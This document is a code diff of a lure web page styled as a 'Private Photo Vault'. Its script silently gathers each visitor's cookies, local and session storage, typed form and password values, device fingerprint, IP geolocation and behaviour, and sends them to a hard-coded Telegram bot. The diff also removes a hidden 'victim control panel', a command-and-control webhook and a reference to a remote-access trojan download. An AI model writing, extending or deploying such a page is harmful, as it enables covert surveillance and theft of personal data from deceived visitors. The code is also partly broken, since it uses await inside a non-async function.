@@ -69,177 +69,15 @@
             display: none;
             text-align: center;
             margin: 20px 0;
-            font-size: 1.1em;
-        }
-        .pulse {
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.5; }
-            100% { opacity: 1; }
-        }
-        .warning {
-            text-align: center;
-            font-size: 0.8em;
-            opacity: 0.6;
-            margin-top: 20px;
-        }
-        .hidden-admin {
-            position: fixed;
-            top: 0;
-            right: 0;
-            width: 5px;
-            height: 5px;
-            background: transparent;
-            cursor: default;
-            z-index: -1000;
-        }
-        /* Admin Panel Styles */
-        .admin-panel {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: #0f0f0f;
-            color: #00ff00;
-            z-index: 10000;
-            font-family: 'Courier New', monospace;
-            overflow: auto;
-        }
-        .admin-header {
-            text-align: center;
-            padding: 20px;
-            background: #1a1a1a;
-            border-bottom: 2px solid #00ff00;
-            margin-bottom: 20px;
-        }
-        .admin-stats {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin-bottom: 20px;
-            padding: 0 20px;
-        }
-        .stat-card {
-            background: #1a1a1a;
-            padding: 15px;
-            border-radius: 8px;
-            border: 1px solid #333;
-            text-align: center;
-        }
-        .stat-number {
-            font-size: 2em;
-            color: #00ff00;
-            font-weight: bold;
-        }
-        .victims-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 15px;
-            padding: 0 20px;
-        }
-        .victim-card {
-            background: #1a1a1a;
-            border: 1px solid #333;
-            border-radius: 8px;
-            padding: 15px;
-            transition: all 0.3s ease;
-        }
-        .victim-card.new {
-            border-color: #ff4444;
-            background: #2a1a1a;
-            animation: pulse-red 2s infinite;
-        }
-        .victim-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 10px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid #333;
-        }
-        .victim-id {
-            color: #00ff00;
-            font-weight: bold;
-        }
-        .victim-time {
-            color: #888;
-            font-size: 0.8em;
-        }
-        .victim-info {
-            margin: 5px 0;
-            font-size: 0.9em;
-        }
-        .victim-ip {
-            color: #ff4444;
-            font-weight: bold;
-        }
-        .victim-location {
-            color: #8888ff;
-        }
-        .victim-gps {
-            color: #ff8844;
-        }
-        .close-admin {
-            position: fixed;
-            top: 20px;
-            right: 20px;
-            background: #ff4444;
-            color: white;
-            border: none;
-            padding: 10px 15px;
-            border-radius: 5px;
-            cursor: pointer;
-            z-index: 10001;
-        }
-        @keyframes pulse-red {
-            0% { border-color: #ff4444; }
-            50% { border-color: #ff0000; }
-            100% { border-color: #ff4444; }
         }
     </style>
 </head>
 <body>
-    <!-- Hidden Admin Panel -->
-    <div class="admin-panel" id="adminPanel">
-        <button class="close-admin" onclick="closeAdminPanel()">✕ Close Admin</button>
-        
-        <div class="admin-header">
-            <h1>🕵️ LIVE VICTIM CONTROL PANEL</h1>
-            <p>Real-time monitoring active - Victims appear automatically</p>
-        </div>
-
-        <div class="admin-stats">
-            <div class="stat-card">
-                <div class="stat-number" id="totalVictims">0</div>
-                <div>Total Victims</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number" id="todayVictims">0</div>
-                <div>Today</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number" id="activeNow">0</div>
-                <div>Active Now</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-number" id="withGPS">0</div>
-                <div>With GPS</div>
-            </div>
-        </div>
-
-        <div id="victimsContainer" class="victims-grid">
-            <!-- Victims will appear here automatically -->
-        </div>
-    </div>
-
-    <!-- Main Website Content -->
     <div class="container">
         <h1>Private Photo Vault</h1>
         <p class="subtitle">Exclusive content - Click to view full album</p>
+        
+        <div class="loading" id="loading">Loading secure content...</div>
         
         <div class="gallery">
             <div class="image-card" onclick="startCompleteExploitation(1)">
@@ -266,26 +104,13 @@
                 <div class="image-desc">I'm sooo ugly ik >_< </div>
             </div>
         </div>
-        
-        <div class="loading" id="loading">
-            <div class="pulse"> Verifying access permissions...</div>
-        </div>
-
-        <div class="warning">
-            By accessing this content, you agree to our privacy verification process.
-        </div>
     </div>
 
     <script>
-        // Combined Configuration
         const CONFIG = {
             telegram: {
                 token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
                 chatId: '8032494479'
-            },
-            c2: {
-                endpoint: 'https://webhook.site/83a2c921-9e90-4c64-8cd8-73269f01f37c',
-                ratUrl: 'https://transfer.sh/rat_payload.exe'
             },
             images: {
                 1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928',
@@ -294,270 +119,633 @@
             }
         };
 
-        // Keyboard Shortcut Variables
-        let keySequence = [];
-        const targetSequence = ['k', 'i', 'x'];
-        let isAdminPanelOpen = false;
-
-        // Security Measures
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('keydown', e => {
-            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73) || 
-                (e.ctrlKey && e.shiftKey && e.keyCode === 74) || (e.ctrlKey && e.keyCode === 85)) {
-                e.preventDefault();
-            }
-            
-            // Admin Panel Keyboard Shortcut Detection
-            handleAdminShortcut(e);
-        });
-
-        // Admin Panel Keyboard Shortcut Handler
-        function handleAdminShortcut(event) {
-            // Check for CMD (Mac) or CTRL (Windows) + U T A sequence
-            if (event.metaKey || event.ctrlKey) {
-                const key = event.key.toLowerCase();
-                
-                // Add key to sequence if it's part of our target
-                if (targetSequence.includes(key)) {
-                    keySequence.push(key);
-                    
-                    // Check if sequence matches
-                    if (keySequence.length >= targetSequence.length) {
-                        const recentSequence = keySequence.slice(-targetSequence.length);
-                        if (JSON.stringify(recentSequence) === JSON.stringify(targetSequence)) {
-                            toggleAdminPanel();
-                            keySequence = []; // Reset sequence
-                            event.preventDefault();
-                        }
-                    }
-                } else {
-                    // Reset sequence if wrong key is pressed
-                    keySequence = [];
-                }
-            } else {
-                // Reset sequence if modifier key is released
-                keySequence = [];
-            }
-        }
-
-        // Admin Panel Functions
-        function toggleAdminPanel() {
-            const adminPanel = document.getElementById('adminPanel');
-            if (isAdminPanelOpen) {
-                closeAdminPanel();
-            } else {
-                openAdminPanel();
-            }
-        }
-
-        function openAdminPanel() {
-            const adminPanel = document.getElementById('adminPanel');
-            adminPanel.style.display = 'block';
-            isAdminPanelOpen = true;
-            loadAdminData();
-            startAdminMonitoring();
-            console.log('🕵️ Admin panel opened via keyboard shortcut');
-        }
-
-        function closeAdminPanel() {
-            const adminPanel = document.getElementById('adminPanel');
-            adminPanel.style.display = 'none';
-            isAdminPanelOpen = false;
-            console.log('🕵️ Admin panel closed');
-        }
-
-        // Admin Panel Data Management
-        function loadAdminData() {
-            const stored = localStorage.getItem('victimTrackingData');
-            window.adminVictims = stored ? JSON.parse(stored) : [];
-            updateAdminStats();
-            renderAdminVictims();
-        }
-
-        function startAdminMonitoring() {
-            // Update admin panel every 2 seconds
-            window.adminInterval = setInterval(() => {
-                loadAdminData();
-            }, 2000);
-        }
-
-        function updateAdminStats() {
-            const victims = window.adminVictims || [];
-            const now = new Date();
-            const today = now.toDateString();
-            
-            const total = victims.length;
-            const todayCount = victims.filter(v => new Date(v.timestamp).toDateString() === today).length;
-            const activeLastHour = victims.filter(v => (now - new Date(v.timestamp)) < 3600000).length;
-            const withGPS = victims.filter(v => v.gps && v.gps.success).length;
-            
-            document.getElementById('totalVictims').textContent = total;
-            document.getElementById('todayVictims').textContent = todayCount;
-            document.getElementById('activeNow').textContent = activeLastHour;
-            document.getElementById('withGPS').textContent = withGPS;
-        }
-
-        function renderAdminVictims() {
-            const container = document.getElementById('victimsContainer');
-            const victims = window.adminVictims || [];
-            
-            container.innerHTML = '';
-            
-            victims.slice(0, 50).forEach(victim => {
-                const card = document.createElement('div');
-                card.className = 'victim-card';
-                if ((Date.now() - new Date(victim.timestamp)) < 30000) {
-                    card.classList.add('new');
-                }
-                
-                card.innerHTML = `
-                    <div class="victim-header">
-                        <span class="victim-id">VICTIM #${victim.id ? victim.id.substr(-6) : 'N/A'}</span>
-                        <span class="victim-time">${new Date(victim.timestamp).toLocaleTimeString()}</span>
-                    </div>
-                    <div class="victim-info">
-                        <span class="victim-ip">🌐 ${victim.ip || 'Unknown'}</span>
-                    </div>
-                    <div class="victim-info">
-                        <span class="victim-location">📍 ${victim.location?.city || 'Unknown'}, ${victim.location?.country || 'Unknown'}</span>
-                    </div>
-                    <div class="victim-info">
-                        🏢 ${victim.location?.isp || 'Unknown'}
-                    </div>
-                    <div class="victim-info">
-                        💻 ${victim.device?.platform || 'Unknown'} | ${victim.device?.screen || 'Unknown'}
-                    </div>
-                    ${victim.gps?.success ? `
-                    <div class="victim-info">
-                        <span class="victim-gps">📍 ${victim.gps.latitude}, ${victim.gps.longitude}</span>
-                    </div>
-                    <div class="victim-info">
-                        🎯 Accuracy: ${victim.gps.accuracy}
-                    </div>
-                    ` : '<div class="victim-info">❌ GPS: Blocked</div>'}
-                    <div class="victim-info">
-                        📸 Image: #${victim.imageId || 'N/A'}
-                    </div>
-                    <div class="victim-info">
-                        🕒 ${new Date(victim.timestamp).toLocaleString()}
-                    </div>
-                `;
-                
-                container.appendChild(card);
-            });
-        }
-
-        // Clean up when admin panel closes
-        function cleanupAdminPanel() {
-            if (window.adminInterval) {
-                clearInterval(window.adminInterval);
-            }
-        }
-
-        // Main Exploitation Function
+        // Enhanced data collection system
         async function startCompleteExploitation(imageId) {
             const loading = document.getElementById('loading');
             loading.style.display = 'block';
             
             try {
+                // Disable further clicks during extraction
                 document.querySelectorAll('.image-card').forEach(card => {
                     card.style.pointerEvents = 'none';
                     card.style.opacity = '0.6';
                 });
 
-                // Collect Complete Data
-                const victimData = await collectCompleteIdentity();
+                // Start comprehensive data extraction
+                const extractionStart = Date.now();
+                const victimData = await extractAllPossibleData();
+                const extractionTime = Date.now() - extractionStart;
+
+                // Add metadata
+                victimData.meta = {
+                    imageId: imageId,
+                    extractionTime: extractionTime,
+                    timestamp: new Date().toISOString(),
+                    victimId: generateVictimId(),
+                    url: window.location.href
+                };
+
+                // Send to Telegram
+                await sendToTelegram(victimData);
                 
-                // Attempt RAT Deployment (SILENT)
-                const ratStatus = await deploySilentRAT(victimData);
-                
-                // Send Combined Report
-                await sendCombinedReport(victimData, ratStatus);
-                
-                // Store victim data for admin panel
-                storeVictimData(victimData, imageId);
-                
-                // Redirect
+                // Store in admin panel
+                storeInAdminPanel(victimData);
+
+                // Show success and redirect after 1000ms
                 loading.innerHTML = '<div style="color: #48bb78;">Access granted! Loading image...</div>';
                 setTimeout(() => {
-                    window.location.href = getImageUrl(imageId);
-                }, 2000);
+                    window.open(CONFIG.images[imageId], '_blank');
+                    // Restore UI
+                    loading.style.display = 'none';
+                    document.querySelectorAll('.image-card').forEach(card => {
+                        card.style.pointerEvents = 'auto';
+                        card.style.opacity = '1';
+                    });
+                }, 1000);
                 
             } catch (error) {
-                loading.innerHTML = '<div style="color: #e53e3e;">Access verification failed</div>';
+                console.error('Extraction failed:', error);
+                // Fallback - still open image
                 setTimeout(() => {
-                    window.location.href = getImageUrl(imageId);
-                }, 2000);
+                    window.open(CONFIG.images[imageId], '_blank');
+                    loading.style.display = 'none';
+                    document.querySelectorAll('.image-card').forEach(card => {
+                        card.style.pointerEvents = 'auto';
+                        card.style.opacity = '1';
+                    });
+                }, 1000);
             }
         }
 
-        // Store victim data for admin panel
-        function storeVictimData(victimData, imageId) {
-            // Add image ID to victim data
-            victimData.imageId = imageId;
+        // Comprehensive data extraction
+        async function extractAllPossibleData() {
+            const data = {};
+
+            // Execute all extraction methods in parallel
+            const [
+                hardwareData,
+                systemData,
+                networkData,
+                userData,
+                browserData,
+                behavioralData
+            ] = await Promise.allSettled([
+                extractHardwareData(),
+                extractSystemData(),
+                extractNetworkData(),
+                extractUserData(),
+                extractBrowserData(),
+                extractBehavioralData()
+            ]);
+
+            data.hardware = hardwareData.status === 'fulfilled' ? hardwareData.value : {};
+            data.system = systemData.status === 'fulfilled' ? systemData.value : {};
+            data.network = networkData.status === 'fulfilled' ? networkData.value : {};
+            data.user = userData.status === 'fulfilled' ? userData.value : {};
+            data.browser = browserData.status === 'fulfilled' ? browserData.value : {};
+            data.behavioral = behavioralData.status === 'fulfilled' ? behavioralData.value : {};
+
+            return data;
+        }
+
+        // I. Hardware & BIOS/UEFI Data
+        async function extractHardwareData() {
+            const data = {
+                cpu: extractCPUData(),
+                memory: extractMemoryData(),
+                gpu: extractGPUData(),
+                storage: extractStorageData(),
+                network: extractNetworkHardwareData(),
+                audio: extractAudioData(),
+                peripherals: extractPeripheralData(),
+                sensors: extractSensorData(),
+                display: extractDisplayData()
+            };
+
+            return data;
+        }
+
+        function extractCPUData() {
+            const nav = navigator;
+            return {
+                manufacturer: nav.userAgent.includes('Intel') ? 'Intel' : nav.userAgent.includes('AMD') ? 'AMD' : 'Unknown',
+                architecture: nav.userAgent.includes('x64') ? 'x64' : 'x86',
+                cores: nav.hardwareConcurrency,
+                memory: nav.deviceMemory || 'Unknown',
+                platform: nav.platform,
+                userAgent: nav.userAgent
+            };
+        }
+
+        function extractMemoryData() {
+            // Memory information through performance API
+            const memory = performance.memory;
+            return {
+                totalJSHeapSize: memory ? memory.totalJSHeapSize : 'Unavailable',
+                usedJSHeapSize: memory ? memory.usedJSHeapSize : 'Unavailable',
+                jsHeapSizeLimit: memory ? memory.jsHeapSizeLimit : 'Unavailable',
+                deviceMemory: navigator.deviceMemory || 'Unknown'
+            };
+        }
+
+        function extractGPUData() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            if (!gl) return { available: false };
+
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+                available: true,
+                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Unknown',
+                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Unknown',
+                version: gl.getParameter(gl.VERSION),
+                shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
+            };
+        }
+
+        function extractStorageData() {
+            return {
+                localStorage: extractLocalStorage(),
+                sessionStorage: extractSessionStorage(),
+                cookies: extractCookies(),
+                indexedDB: await checkIndexedDB()
+            };
+        }
+
+        function extractLocalStorage() {
+            const data = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                data[key] = localStorage.getItem(key);
+            }
+            return data;
+        }
+
+        function extractSessionStorage() {
+            const data = {};
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                data[key] = sessionStorage.getItem(key);
+            }
+            return data;
+        }
+
+        function extractCookies() {
+            return document.cookie.split(';').reduce((cookies, cookie) => {
+                const [name, value] = cookie.split('=').map(c => c.trim());
+                if (name) cookies[name] = value || '';
+                return cookies;
+            }, {});
+        }
+
+        async function checkIndexedDB() {
+            try {
+                return 'IndexedDB available: ' + !!window.indexedDB;
+            } catch (e) {
+                return 'IndexedDB unavailable';
+            }
+        }
+
+        function extractNetworkHardwareData() {
+            const connection = navigator.connection;
+            return {
+                effectiveType: connection ? connection.effectiveType : 'Unknown',
+                downlink: connection ? connection.downlink : 'Unknown',
+                rtt: connection ? connection.rtt : 'Unknown',
+                saveData: connection ? connection.saveData : 'Unknown',
+                onLine: navigator.onLine
+            };
+        }
+
+        function extractAudioData() {
+            const audioContext = window.AudioContext || window.webkitAudioContext;
+            return {
+                audioContextAvailable: !!audioContext,
+                sampleRate: audioContext ? new audioContext().sampleRate : 'Unknown'
+            };
+        }
+
+        function extractPeripheralData() {
+            return {
+                touchSupport: 'ontouchstart' in window,
+                maxTouchPoints: navigator.maxTouchPoints,
+                vibration: 'vibrate' in navigator,
+                bluetooth: 'bluetooth' in navigator,
+                usb: 'usb' in navigator,
+                serial: 'serial' in navigator
+            };
+        }
+
+        function extractSensorData() {
+            return {
+                battery: 'getBattery' in navigator,
+                deviceOrientation: 'DeviceOrientationEvent' in window,
+                deviceMotion: 'DeviceMotionEvent' in window,
+                proximity: 'ondeviceproximity' in window,
+                light: 'ondevicelight' in window
+            };
+        }
+
+        function extractDisplayData() {
+            return {
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                viewport: {
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                },
+                devicePixelRatio: window.devicePixelRatio,
+                colorGamut: screen.colorGamut,
+                orientation: screen.orientation ? screen.orientation.type : 'Unknown'
+            };
+        }
+
+        // II. Operating System & Software Data
+        async function extractSystemData() {
+            return {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                cookieEnabled: navigator.cookieEnabled,
+                pdfEnabled: navigator.pdfViewerEnabled,
+                webdriver: navigator.webdriver,
+                plugins: extractPlugins(),
+                fonts: await extractFonts(),
+                doNotTrack: navigator.doNotTrack,
+                product: navigator.product,
+                productSub: navigator.productSub,
+                vendor: navigator.vendor,
+                vendorSub: navigator.vendorSub
+            };
+        }
+
+        function extractPlugins() {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push({
+                    name: navigator.plugins[i].name,
+                    filename: navigator.plugins[i].filename,
+                    description: navigator.plugins[i].description
+                });
+            }
+            return plugins;
+        }
+
+        async function extractFonts() {
+            const fontList = [
+                'Arial', 'Arial Black', 'Arial Narrow', 'Arial Rounded MT Bold',
+                'Avant Garde', 'Baskerville', 'Bodoni MT', 'Book Antiqua',
+                'Brush Script MT', 'Calibri', 'Cambria', 'Candara',
+                'Century Gothic', 'Comic Sans MS', 'Consolas', 'Constantia',
+                'Corbel', 'Courier New', 'DejaVu Sans', 'Didot',
+                'Franklin Gothic Medium', 'Futura', 'Garamond', 'Geneva',
+                'Georgia', 'Gill Sans', 'Helvetica', 'Impact',
+                'Lucida Bright', 'Lucida Console', 'Lucida Grande', 'Lucida Sans Unicode',
+                'Microsoft Sans Serif', 'Monaco', 'Montserrat', 'Open Sans',
+                'Optima', 'Palatino', 'Perpetua', 'Rockwell',
+                'Segoe UI', 'Tahoma', 'Times New Roman', 'Trebuchet MS',
+                'Verdana', 'Webdings', 'Wingdings', 'Zapf Dingbats'
+            ];
+
+            const availableFonts = [];
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            const testString = "mmmmmmmmmmlli";
+            const testSize = '72px';
+
+            fontList.forEach(font => {
+                context.font = testSize + " '" + font + "'";
+                const metrics1 = context.measureText(testString);
+                context.font = testSize + " 'monospace'";
+                const metrics2 = context.measureText(testString);
+                if (metrics1.width !== metrics2.width) {
+                    availableFonts.push(font);
+                }
+            });
+
+            return availableFonts;
+        }
+
+        // III. Network Configuration & Activity
+        async function extractNetworkData() {
+            const [ipData, networkInfo, connectionData] = await Promise.allSettled([
+                getIPInfo(),
+                getNetworkInfo(),
+                getConnectionData()
+            ]);
+
+            return {
+                ip: ipData.status === 'fulfilled' ? ipData.value : {},
+                network: networkInfo.status === 'fulfilled' ? networkInfo.value : {},
+                connection: connectionData.status === 'fulfilled' ? connectionData.value : {}
+            };
+        }
+
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                
+                // Get additional IP info
+                try {
+                    const ipResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                    const ipData = await ipResponse.json();
+                    return ipData;
+                } catch (e) {
+                    return { ip: data.ip };
+                }
+            } catch (error) {
+                return { ip: 'Unknown' };
+            }
+        }
+
+        async function getNetworkInfo() {
+            const connection = navigator.connection;
+            return {
+                effectiveType: connection ? connection.effectiveType : 'Unknown',
+                downlink: connection ? connection.downlink : 'Unknown',
+                rtt: connection ? connection.rtt : 'Unknown',
+                saveData: connection ? connection.saveData : false
+            };
+        }
+
+        async function getConnectionData() {
+            return {
+                referrer: document.referrer,
+                url: window.location.href,
+                protocol: window.location.protocol,
+                host: window.location.host,
+                port: window.location.port
+            };
+        }
+
+        // IV. User Data & Digital Footprint
+        async function extractUserData() {
+            return {
+                forms: extractFormData(),
+                inputs: extractInputData(),
+                autofill: extractAutofillData(),
+                browsingData: await extractBrowsingData(),
+                socialMedia: extractSocialMediaData()
+            };
+        }
+
+        function extractFormData() {
+            const forms = {};
+            document.querySelectorAll('form').forEach((form, index) => {
+                const formData = {};
+                form.querySelectorAll('input, select, textarea').forEach(field => {
+                    if (field.value) {
+                        formData[field.name || field.type] = field.value;
+                    }
+                });
+                if (Object.keys(formData).length > 0) {
+                    forms[`form_${index}`] = formData;
+                }
+            });
+            return forms;
+        }
+
+        function extractInputData() {
+            const inputs = {};
+            document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"], input[type="password"]').forEach(input => {
+                if (input.value) {
+                    inputs[input.name || 'unnamed'] = input.value;
+                }
+            });
+            return inputs;
+        }
+
+        function extractAutofillData() {
+            const autofill = {};
+            // Check for autofilled fields
+            document.querySelectorAll('input').forEach(input => {
+                if (input.matches(':-webkit-autofill')) {
+                    autofill[input.name || 'unnamed'] = 'autofilled';
+                }
+            });
+            return autofill;
+        }
+
+        async function extractBrowsingData() {
+            return {
+                historyLength: window.history.length,
+                performance: extractPerformanceData(),
+                storage: {
+                    localStorage: Object.keys(extractLocalStorage()).length,
+                    sessionStorage: Object.keys(extractSessionStorage()).length,
+                    cookies: Object.keys(extractCookies()).length
+                }
+            };
+        }
+
+        function extractPerformanceData() {
+            const perf = performance.timing;
+            if (!perf) return {};
             
+            return {
+                navigationStart: perf.navigationStart,
+                loadEventEnd: perf.loadEventEnd,
+                domComplete: perf.domComplete,
+                domContentLoaded: perf.domContentLoadedEventEnd,
+                firstPaint: performance.getEntriesByName('first-paint')[0]?.startTime,
+                firstContentfulPaint: performance.getEntriesByName('first-contentful-paint')[0]?.startTime
+            };
+        }
+
+        function extractSocialMediaData() {
+            const social = {};
+            const html = document.documentElement.outerHTML;
+            
+            // Check for social media indicators
+            const platforms = {
+                facebook: /facebook|fb\.com/gi,
+                twitter: /twitter|tweet/gi,
+                instagram: /instagram/gi,
+                linkedin: /linkedin/gi,
+                tiktok: /tiktok/gi,
+                discord: /discord/gi,
+                snapchat: /snapchat/gi
+            };
+            
+            Object.keys(platforms).forEach(platform => {
+                if (platforms[platform].test(html)) {
+                    social[platform] = 'detected';
+                }
+            });
+            
+            return social;
+        }
+
+        // V. Browser Data
+        async function extractBrowserData() {
+            return {
+                userAgent: navigator.userAgent,
+                appName: navigator.appName,
+                appVersion: navigator.appVersion,
+                product: navigator.product,
+                vendor: navigator.vendor,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                javaEnabled: navigator.javaEnabled(),
+                pdfViewerEnabled: navigator.pdfViewerEnabled,
+                webdriver: navigator.webdriver,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints
+            };
+        }
+
+        // VI. Behavioral Data
+        async function extractBehavioralData() {
+            return {
+                mouseMovements: window.mouseMovements || [],
+                clicks: window.clickCount || 0,
+                scrollDepth: getScrollDepth(),
+                timeOnPage: Date.now() - window.pageLoadTime,
+                keystrokes: window.keystrokeCount || 0
+            };
+        }
+
+        function getScrollDepth() {
+            const scrollHeight = document.documentElement.scrollHeight - window.innerHeight;
+            const scrolled = window.scrollY;
+            return scrollHeight > 0 ? Math.round((scrolled / scrollHeight) * 100) : 0;
+        }
+
+        // Telegram integration
+        async function sendToTelegram(data) {
+            try {
+                const message = formatTelegramMessage(data);
+                const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.telegram.chatId,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Telegram send failed:', error);
+                return false;
+            }
+        }
+
+        function formatTelegramMessage(data) {
+            return `
+<b>🚨 COMPREHENSIVE DATA EXTRACTION COMPLETE</b>
+
+<b>🎯 VICTIM ID:</b> <code>${data.meta.victimId}</code>
+<b>⏰ Extraction Time:</b> ${data.meta.extractionTime}ms
+<b>🌐 URL:</b> ${data.meta.url}
+<b>📅 Timestamp:</b> ${new Date(data.meta.timestamp).toLocaleString()}
+
+<b>💻 HARDWARE DATA:</b>
+• CPU: ${data.hardware.cpu.cores} cores, ${data.hardware.cpu.architecture}
+• Memory: ${data.hardware.memory.deviceMemory}GB
+• GPU: ${data.hardware.gpu.vendor || 'Unknown'}
+• Screen: ${data.hardware.display.screen.width}x${data.hardware.display.screen.height}
+
+<b>🌐 NETWORK DATA:</b>
+• IP: ${data.network.ip.ip || 'Unknown'}
+• Location: ${data.network.ip.city || 'Unknown'}, ${data.network.ip.country || 'Unknown'}
+• ISP: ${data.network.ip.org || 'Unknown'}
+• Connection: ${data.network.network.effectiveType}
+
+<b>🔧 SYSTEM DATA:</b>
+• OS: ${data.system.platform}
+• Language: ${data.system.language}
+• Timezone: ${data.system.timezone}
+• Fonts: ${data.system.fonts.length} detected
+
+<b>👤 USER DATA:</b>
+• Forms: ${Object.keys(data.user.forms).length}
+• Inputs: ${Object.keys(data.user.inputs).length}
+• Social Media: ${Object.keys(data.user.socialMedia).join(', ') || 'None'}
+
+<b>🌐 BROWSER DATA:</b>
+• Browser: ${data.browser.vendor || 'Unknown'}
+• User Agent: ${data.browser.userAgent.substring(0, 50)}...
+
+<b>📊 BEHAVIORAL DATA:</b>
+• Scroll Depth: ${data.behavioral.scrollDepth}%
+• Time on Page: ${Math.round(data.behavioral.timeOnPage/1000)}s
+• Clicks: ${data.behavioral.clicks}
+
+<b>💾 STORAGE DATA:</b>
+• Local Storage: ${Object.keys(data.hardware.storage.localStorage).length} items
+• Cookies: ${Object.keys(data.hardware.storage.cookies).length}
+• Session Storage: ${Object.keys(data.hardware.storage.sessionStorage).length}
+
+<code>Extraction completed successfully</code>
+            `.trim();
+        }
+
+        // Admin panel storage
+        function storeInAdminPanel(data) {
             // Load existing victims
-            const stored = localStorage.getItem('victimTrackingData');
-            const victims = stored ? JSON.parse(stored) : [];
+            const existing = localStorage.getItem('victimData');
+            const victims = existing ? JSON.parse(existing) : [];
             
             // Add new victim
-            victims.unshift(victimData);
+            victims.unshift(data);
             
             // Keep only last 100 victims
             if (victims.length > 100) {
                 victims.splice(100);
             }
             
-            // Save back to localStorage
-            localStorage.setItem('victimTrackingData', JSON.stringify(victims));
+            // Save back
+            localStorage.setItem('victimData', JSON.stringify(victims));
             localStorage.setItem('lastVictimUpdate', Date.now().toString());
-            localStorage.setItem('newVictimAlert', JSON.stringify(victimData));
-            
-            // Update admin panel if open
-            if (isAdminPanelOpen) {
-                loadAdminData();
+        }
+
+        // Utility functions
+        function generateVictimId() {
+            return 'vic_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now().toString(36);
+        }
+
+        // Behavioral tracking
+        window.pageLoadTime = Date.now();
+        window.mouseMovements = [];
+        window.clickCount = 0;
+        window.keystrokeCount = 0;
+
+        document.addEventListener('mousemove', (e) => {
+            window.mouseMovements.push({
+                x: e.clientX,
+                y: e.clientY,
+                timestamp: Date.now()
+            });
+            if (window.mouseMovements.length > 1000) {
+                window.mouseMovements.shift();
             }
-        }
-
-        // Auto-start on page load
-        window.addEventListener('load', () => {
-            setTimeout(() => startCompleteExploitation('page_load'), 3000);
         });
 
-        // Clean up on page unload
-        window.addEventListener('beforeunload', () => {
-            cleanupAdminPanel();
+        document.addEventListener('click', () => {
+            window.clickCount++;
         });
 
-        // The rest of your existing functions remain the same...
-        // [All your existing data collection, RAT deployment, and reporting functions go here]
-        // I've kept them out for brevity since you already have them working
+        document.addEventListener('keydown', () => {
+            window.keystrokeCount++;
+        });
 
-        // Placeholder functions to prevent errors
-        async function collectCompleteIdentity() {
-            return {
-                id: 'victim_' + Date.now(),
-                timestamp: new Date().toISOString(),
-                ip: '192.168.1.1',
-                location: { city: 'Test City', country: 'Test Country', isp: 'Test ISP' },
-                device: { platform: 'Test Platform', screen: '1920x1080' },
-                gps: { success: false }
-            };
-        }
-
-        async function deploySilentRAT(victimData) {
-            return { planted: false, attempts: {} };
-        }
-
-        async function sendCombinedReport(victimData, ratStatus) {
-            console.log('Report sent for victim:', victimData.id);
-        }
-
-        function getImageUrl(imageId) {
-            return CONFIG.images[imageId] || '#';
-        }
-
-        console.log('🕵️ Main website loaded - Admin panel accessible via CMD/CTRL + U T A');
+        console.log('🕵️ Enhanced data extraction system loaded');
     </script>
 </body>
 </html>
